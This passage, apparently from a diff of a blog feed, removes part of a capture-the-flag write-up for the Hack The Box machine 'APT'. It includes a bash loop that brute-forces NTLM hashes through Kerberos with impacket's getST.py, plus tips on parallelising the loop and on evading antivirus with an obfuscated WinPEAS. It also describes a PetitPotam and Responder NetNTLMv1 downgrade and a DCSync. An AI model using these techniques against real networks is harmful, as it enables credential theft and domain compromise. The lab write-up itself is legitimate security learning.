-
-<p><img src="/assets/APT/kerberute-userenum.jpg" alt="kerberute-userenum" /></p>
-
-<p><em>When trying to bruteforce the hashes,</em> we get blocked.</p>
-
-<p><img src="/assets/APT/bruteforce-defenses.jpg" alt="bruteforce-defenses" /></p>
-
-<p>But did you notice something? <em>even with that many attempts,</em> the account <strong>didn’t get locked out ;]</strong> we know so because locked out accounts give a <strong>different error message</strong>.</p>
-
-<p>We’re going to try bruteforcing using <strong>Kerberos</strong>. It’s different from using SMB because <strong>it doesn’t leave a 4625 logon event behind.</strong></p>
-
-<p>I had to reset the machine to get the block removed. Perhaps it was configured for a ban time that was too long.</p>
-
-<p>We’re going to do this using impacket’s <code class="language-plaintext highlighter-rouge">getST.py</code> script. By building a bash wrapper around it to enable bruteforcing with a hash since that feature isn’t in <code class="language-plaintext highlighter-rouge">kerbrute</code> at the moment.</p>
-
-<p>Here’s what it looks like:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">index</span><span class="o">=</span>1
-<span class="k">for </span><span class="nb">hash </span><span class="k">in</span> <span class="si">$(</span><span class="nb">cat </span>hashes.txt<span class="si">)</span><span class="p">;</span> <span class="k">do
-	</span><span class="nb">echo</span> <span class="s2">"[*] [</span><span class="nv">$index</span><span class="s2">/4000] Spraying hash </span><span class="nv">$hash</span><span class="s2"> for Administrator"</span>
-  	getST.py <span class="nt">-dc-ip</span> apt <span class="nt">-spn</span> cifs/apt.htb.local htb.local/administrator <span class="nt">-hashes</span> <span class="s2">":</span><span class="nv">$hash</span><span class="s2">"</span> | <span class="nb">grep</span> <span class="nt">-Pv</span> <span class="s1">'not found|Getting TGT|PREAUTH_FAILED|Copyright 2022'</span>| <span class="nb">sed</span> <span class="nt">-r</span> <span class="s1">'/^\s*$/d'</span>
-	<span class="nb">echo</span> <span class="s2">"[*] [</span><span class="nv">$index</span><span class="s2">/4000] Spraying hash </span><span class="nv">$hash</span><span class="s2"> for Henry.vinson"</span>
-  	getST.py <span class="nt">-dc-ip</span> apt <span class="nt">-spn</span> cifs/apt.htb.local htb.local/Henry.vinson <span class="nt">-hashes</span> <span class="s2">":</span><span class="nv">$hash</span><span class="s2">"</span> | <span class="nb">grep</span> <span class="nt">-Pv</span> <span class="s1">'not found|Getting TGT|PREAUTH_FAILED|Copyright 2022'</span>| <span class="nb">sed</span> <span class="nt">-r</span> <span class="s1">'/^\s*$/d'</span>  	
-  	<span class="o">((</span><span class="nv">index</span><span class="o">=</span>index+1<span class="o">))</span>
-<span class="k">done</span>
-</code></pre></div></div>
-
-<p><em>In the script,</em> we request a ticket for SMB access, clear out any unnecessary output as well as print out some progress messages.</p>
-
-<p><strong>Note:</strong> To speed things up, you are advised to break down the hashes list into smaller chunks and run multiple instances of the script in parallel. Or else that process would take significantly much more time.</p>
-
-<p>The <strong>Kerberos bruteforce</strong> worked well and we didn’t get blocked. We got a working hash right near the end of the list (the 3558th entry).</p>
-
-<p><img src="/assets/APT/kerberos-hash-brute.jpg" alt="kerberos-hash-brute" /></p>
-
-<p><strong>Side Note:</strong> <em>After checking the official writeup,</em> I found that this <em>wasn’t the indended way</em>. But hey! it worked XD</p>
-
-<p><img src="/assets/APT/auth-with-henry.jpg" alt="auth-with-henry" /></p>
-
-<h2 id="finding-creds-via-remote-registry">Finding creds via Remote Registry</h2>
-<p>Alright. <em>After finally getting our first set of credentials,</em> we sadly don’t find anything to get us further using conventional methods.</p>
-
-<ul>
-  <li>Henry didn’t have <em>8</em> access</li>
-  <li><strong>Bloodhound</strong> didn’t return anything we could exploit</li>
-  <li>No <strong>Kerberoastable</strong> or <strong>ASREProastable</strong> accounts were there</li>
-</ul>
-
-<p><em>However, when were looking for information in the registry using impacket’s</em> <code class="language-plaintext highlighter-rouge">reg.py</code>, we found creds for <code class="language-plaintext highlighter-rouge">henry.vinsdon_adm</code> under <code class="language-plaintext highlighter-rouge">HKU\Software\GiganticHostingManagementSystem</code>. It seemed like his administrator account.</p>
-
-<p><img src="/assets/APT/creds-in-registry.jpg" alt="creds-in-registry" /></p>
-
-<p>And he turned out to have <strong>WinRM</strong> access when we checked.</p>
-
-<p><img src="/assets/APT/winrm-shell-access.jpg" alt="winrm-shell-access" /></p>
-
-<h2 id="privilege-escalation-via-netntlmv1">Privilege Escalation via NetNTLMv1</h2>
-<p><em>When running the standard</em> <code class="language-plaintext highlighter-rouge">WinPEAS.exe</code>, it got caught by <strong>AV.</strong></p>
-
-<p><img src="/assets/APT/normal-winpeas-caught.jpg" alt="normal-winpeas-caught" /></p>
-
-<p>It worked alright when we switched to the <strong>obfuscated version.</strong> (you can find that on the releases page on GitHub)</p>
-
-<p><img src="/assets/APT/obfuscated-peas-worked.jpg" alt="obfuscated-peas-worked" /></p>
-
-<p><em>Scanning the output,</em> we noticed something exploitable: <strong>NetNTLMv1</strong> being enabled.</p>
-
-<p><img src="/assets/APT/netNTLMv1-enabled.jpg" alt="netNTLMv1-enabled" /></p>
-
-<p><em>Basically,</em> exploiting this aims at <strong>forcing a network authentication from the Domain Controller’s machine account back to our machine</strong> where <code class="language-plaintext highlighter-rouge">responder</code> will capture it for a <strong>crackable NetNTLMv1</strong> hash.</p>
-
-<p>We will first set up our <strong>responder’s configuration</strong> to send a certain challenge. This is for making the hash cracking easier.</p>
-
-<p><em>in</em> <code class="language-plaintext highlighter-rouge">/etc/responder/Responder.conf</code>, we set the challenge to <strong>112233445566778899</strong></p>
-
-<p><img src="/assets/APT/setting-the-challenge.jpg" alt="setting-the-challenge" /></p>
-
-<p>and we start it with the <code class="language-plaintext highlighter-rouge">--lm</code> flag to force LM hashing downgrade.</p>
-
-<p>We then trigger the authentication using <code class="language-plaintext highlighter-rouge">PetitPotam.py</code>. Here’s what it looks like:</p>
-
-<p><img src="/assets/APT/forced-auth-netNTLMv1.jpg" alt="forced-auth-netNTLMv1" /></p>
-
-<p>We got the NetNTLMv1 hash. Which we will then submit to the website <code class="language-plaintext highlighter-rouge">crack.sh</code> after <strong>formatting it according to their requirements</strong>. The hash should be like this:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>NTHASH:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384
-</code></pre></div></div>
-
-<p><img src="/assets/APT/crack-sh.jpg" alt="crack-sh" /></p>
-
-<p><em>A few minutes after sumbitting,</em> we got back the NTLM hash for the machine in our inbox.</p>
-
-<p><img src="/assets/APT/crack-sh-results.jpg" alt="crack-sh-results" /></p>
-
-<p><em>Of course,</em> we used the machine hash to do a <strong>DCSync</strong> and grabbed the Administrator’s hash to finish the box :D</p>
-
-<p><img src="/assets/APT/dcsync-and-rooting-the-box.jpg" alt="dcsync-and-rooting-the-box" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry></feed>
+</code></pre></div></div>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry></feed>
